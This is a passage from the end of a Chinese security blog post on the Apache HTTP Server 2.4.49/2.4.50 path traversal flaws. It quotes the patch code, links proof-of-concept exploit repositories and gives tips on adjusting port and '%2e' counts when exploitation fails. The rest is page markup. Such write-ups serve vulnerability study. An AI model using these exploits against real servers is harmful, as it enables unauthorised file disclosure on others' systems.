+<p>2）42013——2.4.51版本针对该漏洞进行了多处修改，最核心的一处修改是在<code>ap_normalize_path</code>函数中加强了对url编码的校验，如果检测到存在非标准url编码（%+两个十六进制字符）的情况，就返回编码错误，从根本上杜绝了多重编码可能导致的绕过，修复代码如下：</p>
+<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">while</span> (path[l] != <span class="hljs-string">'\0'</span>) {<br>    <span class="hljs-comment">/* RFC-3986 section 2.3:</span><br><span class="hljs-comment">        *  For consistency, percent-encoded octets in the ranges of</span><br><span class="hljs-comment">        *  ALPHA (%41-%5A and %61-%7A), DIGIT (%30-%39), hyphen (%2D),</span><br><span class="hljs-comment">        *  period (%2E), underscore (%5F), or tilde (%7E) should [...]</span><br><span class="hljs-comment">        *  be decoded to their corresponding unreserved characters by</span><br><span class="hljs-comment">        *  URI normalizers.</span><br><span class="hljs-comment">        */</span><br>    <span class="hljs-keyword">if</span> (decode_unreserved &amp;&amp; path[l] == <span class="hljs-string">'%'</span>) {<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">apr_isxdigit</span>(path[l + <span class="hljs-number">1</span>]) &amp;&amp; <span class="hljs-title function_ invoke__">apr_isxdigit</span>(path[l + <span class="hljs-number">2</span>])) {<br>            <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">char</span> c = <span class="hljs-title function_ invoke__">x2c</span>(&amp;path[l + <span class="hljs-number">1</span>]);<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">TEST_CHAR</span>(c, T_URI_UNRESERVED)) {<br>                <span class="hljs-comment">/* Replace last char and fall through as the current</span><br><span class="hljs-comment">                    * read position */</span><br>                l += <span class="hljs-number">2</span>;<br>                path[l] = c;<br>            }<br>        }<br>        <span class="hljs-keyword">else</span> {<br>            <span class="hljs-comment">/* Invalid encoding */</span><br>            ret = <span class="hljs-number">0</span>;<br>        }<br>    }————https:<span class="hljs-comment">//xz.aliyun.com/t/10359?page=1</span><br></code></pre></td></tr></tbody></table></figure>
+<h2 id="0x05-POC利用">0x05 POC利用</h2>
+<p>项目地址参考：</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/lorddemon/CVE-2021-41773-PoC/">https://github.com/lorddemon/CVE-2021-41773-PoC/</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/0xAlmighty/CVE-2021-41773-PoC">https://github.com/0xAlmighty/CVE-2021-41773-PoC</a></p>
+<p>这里推荐第二个，因为我第一个没成功</p>
+<p>![image-20230916170222150](Apache HTTP Server 2.4.49 路径穿越漏洞/image-20230916170222150.png)</p>
+<p>![image-20230916170230540](Apache HTTP Server 2.4.49 路径穿越漏洞/image-20230916170230540.png)</p>
+<p>不过在利用第二个的时候如果在明确有漏洞但仍未利用的，那需要大家去py修改一些内容，比如端口，或者穿越路径时的%2e的数量等等</p>
+<h2 id="0x06-参考文章">0x06 参考文章</h2>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/wavesky/p/16339732.html">[CVE-2021-41773(42013) Apache HTTP Server路径穿越漏洞复现]</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.ddosi.org/cve-2021-41773/">CVE-2021-41773 Apache HTTP Server路径遍历漏洞0day</a></p>
+<p><a target="_blank" rel="noopener" href="https://chaserw.github.io/2021/10/11/Apache-HTTP-Server%E8%B7%AF%E5%BE%84%E7%A9%BF%E8%B6%8A%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2021-41773%E3%80%81CVE-2021-42013%EF%BC%89%E5%A4%8D%E7%8E%B0/">Apache HTTP Server路径穿越漏洞（CVE-2021-41773、CVE-2021-42013）复现</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.51cto.com/u_12343119/5850921">Apahce HTTPd 2.4.49（CVE-2021-41773）漏洞复现详细教程</a></p>
+
+                
+            </div>
+            <hr/>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        
+            <div class="reprint__author">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-user">
+                        文章作者:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="/about" rel="external nofollow noreferrer">hybcx</a>
+                </span>
+            </div>
+            <div class="reprint__type">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-link">
+                        文章链接:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="http://hybcx.xyz/2023/09/16/apache-http-server-2.4.49-lu-jing-chuan-yue-lou-dong/">http://hybcx.xyz/2023/09/16/apache-http-server-2.4.49-lu-jing-chuan-yue-lou-dong/</a>
+                </span>
+            </div>
+            <div class="reprint__notice">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-copyright">
+                        版权声明:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    本博客所有文章除特別声明外，均采用
+                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
+                    许可协议。转载请注明来源
+                    <a href="/about" target="_blank">hybcx</a>
+                    !
+                </span>
+            </div>
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            
+                                <a href="/tags/CVE/">
+                                    <span class="chip bg-color">CVE</span>
+                                </a>
+                            
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+<div id="article-share">
+
+    
+    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+    <script src="/libs/share/js/social-share.min.js"></script>
+    
+
+    
+
+</div>
+
+                </div>
+            </div>
+            
+                <style>
+    #reward {
+        margin: 40px 0;
+        text-align: center;
+    }
+
+    #reward .reward-link {
+        font-size: 1.4rem;
+        line-height: 38px;
+    }
+
+    #reward .btn-floating:hover {
+        box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2), 0 5px 15px rgba(0, 0, 0, 0.2);
+    }
+
+    #rewardModal {
+        width: 320px;
+        height: 350px;
+    }
+
+    #rewardModal .reward-title {
+        margin: 15px auto;
+        padding-bottom: 5px;
+    }
+
+    #rewardModal .modal-content {
+        padding: 10px;
+    }
+
+    #rewardModal .close {
+        position: absolute;
+        right: 15px;
+        top: 15px;
+        color: rgba(0, 0, 0, 0.5);
+        font-size: 1.3rem;
+        line-height: 20px;
+        cursor: pointer;
+    }
+
+    #rewardModal .close:hover {
+        color: #ef5350;
+        transform: scale(1.3);
+        -moz-transform:scale(1.3);
+        -webkit-transform:scale(1.3);
+        -o-transform:scale(1.3);
+    }
+
+    #rewardModal .reward-tabs {
+        margin: 0 auto;
+        width: 210px;
+    }
+
+    .reward-tabs .tabs {
+        height: 38px;
+        margin: 10px auto;
+        padding-left: 0;
+    }
+
+    .reward-content ul {
+        padding-left: 0 !important;
+    }
+
+    .reward-tabs .tabs .tab {
+        height: 38px;
+        line-height: 38px;
+    }
+
+    .reward-tabs .tab a {
+        color: #fff;
+        background-color: #ccc;
+    }
+
+    .reward-tabs .tab a:hover {
+        background-color: #ccc;
+        color: #fff;
+    }
+
+    .reward-tabs .wechat-tab .active {
+        color: #fff !important;
+        background-color: #22AB38 !important;
+    }
+
+    .reward-tabs .alipay-tab .active {
+        color: #fff !important;
+        background-color: #019FE8 !important;
+    }
+
+    .reward-tabs .reward-img {
+        width: 210px;
+        height: 210px;
+    }
+</style>
+
+<div id="reward">
+    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">赏</a>
+
+    <!-- Modal Structure -->
+    <div id="rewardModal" class="modal">
+        <div class="modal-content">
+            <a class="close modal-close"><i class="fas fa-times"></i></a>
+            <h4 class="reward-title">你的赏识是我前进的动力</h4>
+            <div class="reward-content">
+                <div class="reward-tabs">
+                    <ul class="tabs row">
+                        <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
+                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
+                    </ul>
+                    <div id="alipay">
+                        <img src="/medias/reward/alipay.jpg" class="reward-img" alt="支付宝打赏二维码">
+                    </div>
+                    <div id="wechat">
+                        <img src="/medias/reward/wechat.png" class="reward-img" alt="微信打赏二维码">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    $(function () {
+        $('.tabs').tabs();
+    });
+</script>
+
+            
+        </div>
+    </div>
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+            <div class="card">
+                <a href="/2023/09/16/apache-http-server-2.4.50-zhong-de-lu-jing-bian-li-he-wen-jian-xie-lu-lou-dong-cve-2021-42013/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/15.jpg" class="responsive-img" alt="Apache HTTP Server 2.4.50 中的路径遍历和文件泄露漏洞 (CVE-2021-42013)">
+                        
+                        <span class="card-title">Apache HTTP Server 2.4.50 中的路径遍历和文件泄露漏洞 (CVE-2021-42013)</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2023-09-16
+                        </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/CVE%E6%BC%8F%E6%B4%9E/" class="post-category">
+                                    CVE漏洞
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/CVE/">
+                        <span class="chip bg-color">CVE</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2023/09/16/apache-http-fu-wu-qi-2.4.48-mod-proxy-ssrf-cve-2021-40438/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/22.jpg" class="responsive-img" alt="Apache HTTP 服务器 2.4.48 mod_proxy SSRF (CVE-2021-40438)">
+                        
+                        <span class="card-title">Apache HTTP 服务器 2.4.48 mod_proxy SSRF (CVE-2021-40438)</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2023-09-16
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/CVE%E6%BC%8F%E6%B4%9E/" class="post-category">
+                                    CVE漏洞
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/CVE/">
+                        <span class="chip bg-color">CVE</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+
+</div>
+
+
+
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+
+<!-- 代码语言 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+
+
+<!-- 代码块复制 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
+
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget card" style="background-color: white;">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fas fa-list-ul"></i>
+    </a>
+</div>
+
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            collapseDepth: Number('0'),
+            headingSelector: 'h2, h3, h4'
+        });
+
+        // modify the toc link href to support Chinese.
+        let i = 0;
+        let tocHeading = 'toc-heading-';
+        $('#toc-content a').each(function () {
+            $(this).attr('href', '#' + tocHeading + (++i));
+        });
+
+        // modify the heading title id to support Chinese.
+        i = 0;
+        $('#articleContent').children('h2, h3, h4').each(function () {
+            $(this).attr('id', tocHeading + (++i));
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+
+    
+
+</main>
+
+
+
+
+    <footer class="page-footer bg-color">
+    
+        <link rel="stylesheet" href="/libs/aplayer/APlayer.min.css">
+<style>
+    .aplayer .aplayer-lrc p {
+        
+        display: none;
+        
+        font-size: 12px;
+        font-weight: 700;
+        line-height: 16px !important;
+    }
+
+    .aplayer .aplayer-lrc p.aplayer-lrc-current {
+        
+        display: none;
+        
+        font-size: 15px;
+        color: #42b983;
+    }
+
+    
+    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {
+        left: -66px !important;
+    }
+
+    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {
+        left: 0px !important;
+    }
+
+    
+</style>
+<div class="">
+    
+    <div class="row">
+        <meting-js class="col l8 offset-l2 m10 offset-m1 s12"
+                   server="netease"
+                   type="playlist"
+                   id="503838841"
+                   fixed='true'
+                   autoplay='false'
+                   theme='#42b983'
+                   loop='all'
+                   order='random'
+                   preload='auto'
+                   volume='0.7'
+                   list-folded='true'
+        >
+        </meting-js>
+    </div>
+</div>
+
+<script src="/libs/aplayer/APlayer.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/meting@2/dist/Meting.min.js"></script>
+
+    
+    <div class="container row center-align" style="margin-bottom: 0px !important;">
+        <div class="col s12 m8 l8 copy-right">
+            Copyright&nbsp;&copy;
+            
+                <span id="year">2019-2024</span>
+            
+            <span id="year">2019</span>
+            <a href="/about" target="_blank">hybcx</a>
+            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
+            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
+            <br>
+            
+            
+            
+            
+            
+            
+            <span id="busuanzi_container_site_pv">
+                |&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;<span id="busuanzi_value_site_pv"
+                    class="white-color"></span>&nbsp;次
+            </span>
+            
+            
+            <span id="busuanzi_container_site_uv">
+                |&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;<span id="busuanzi_value_site_uv"
+                    class="white-color"></span>&nbsp;人
+            </span>
+            
+            <br>
+            
+            <br>
+            
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+    <a href="https://github.com/blinkfox" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+        <i class="fab fa-github"></i>
+    </a>
+
+
+
+    <a href="mailto:1181062873@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+        <i class="fas fa-envelope-open"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=1181062873" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 1181062873" data-position="top" data-delay="50">
+        <i class="fab fa-qq"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
+        <i class="fas fa-rss"></i>
+    </a>
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script type="text/javascript">
+$(function () {
+    var searchFunc = function (path, search_id, content_id) {
+        'use strict';
+        $.ajax({
+            url: path,
+            dataType: "xml",
+            success: function (xmlResponse) {
+                // get the contents from search data
+                var datas = $("entry", xmlResponse).map(function () {
+                    return {
+                        title: $("title", this).text(),
+                        content: $("content", this).text(),
+                        url: $("url", this).text()
+                    };
+                }).get();
+                var $input = document.getElementById(search_id);
+                var $resultContent = document.getElementById(content_id);
+                $input.addEventListener('input', function () {
+                    var str = '<ul class=\"search-result-list\">';
+                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+                    $resultContent.innerHTML = "";
+                    if (this.value.trim().length <= 0) {
+                        return;
+                    }
+                    // perform local searching
+                    datas.forEach(function (data) {
+                        var isMatch = true;
+                        var data_title = data.title.trim().toLowerCase();
+                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
+                        var data_url = data.url;
+                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
+                        var index_title = -1;
+                        var index_content = -1;
+                        var first_occur = -1;
+                        // only match artiles with not empty titles and contents
+                        if (data_title !== '' && data_content !== '') {
+                            keywords.forEach(function (keyword, i) {
+                                index_title = data_title.indexOf(keyword);
+                                index_content = data_content.indexOf(keyword);
+                                if (index_title < 0 && index_content < 0) {
+                                    isMatch = false;
+                                } else {
+                                    if (index_content < 0) {
+                                        index_content = 0;
+                                    }
+                                    if (i === 0) {
+                                        first_occur = index_content;
+                                    }
+                                }
+                            });
+                        }
+                        // show search results
+                        if (isMatch) {
+                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
+                            var content = data.content.trim().replace(/<[^>]+>/g, "");
+                            if (first_occur >= 0) {
+                                // cut out 100 characters
+                                var start = first_occur - 20;
+                                var end = first_occur + 80;
+                                if (start < 0) {
+                                    start = 0;
+                                }
+                                if (start === 0) {
+                                    end = 100;
+                                }
+                                if (end > content.length) {
+                                    end = content.length;
+                                }
+                                var match_content = content.substr(start, end);
+                                // highlight all keywords
+                                keywords.forEach(function (keyword) {
+                                    var regS = new RegExp(keyword, "gi");
+                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
+                                });
+
+                                str += "<p class=\"search-result\">" + match_content + "...</p>"
+                            }
+                            str += "</li>";
+                        }
+                    });
+                    str += "</ul>";
+                    $resultContent.innerHTML = str;
+                });
+            }
+        });
+    };
+
+    searchFunc('/search.xml', 'searchInput', 'searchResult');
+});
+</script>
+
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fas fa-arrow-up"></i>
+    </a>
+</div>
+
+
+    <script src="/libs/materialize/materialize.min.js"></script>
+    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="/libs/aos/aos.js"></script>
+    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="/js/matery.js"></script>
+
+    <!-- Baidu Analytics -->
+
+    <!-- Baidu Push -->
+
+<script>
+    (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+
+    
+    <script src="/libs/others/clicklove.js" async="async"></script>
+    
+    
+    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
+    
+
+    
+
+    
+
+	
+    
+
+    
+
+    
+
+    
+    <script src="/libs/instantpage/instantpage.js" type="module"></script>
+    
+
+</body>
+
+</html>
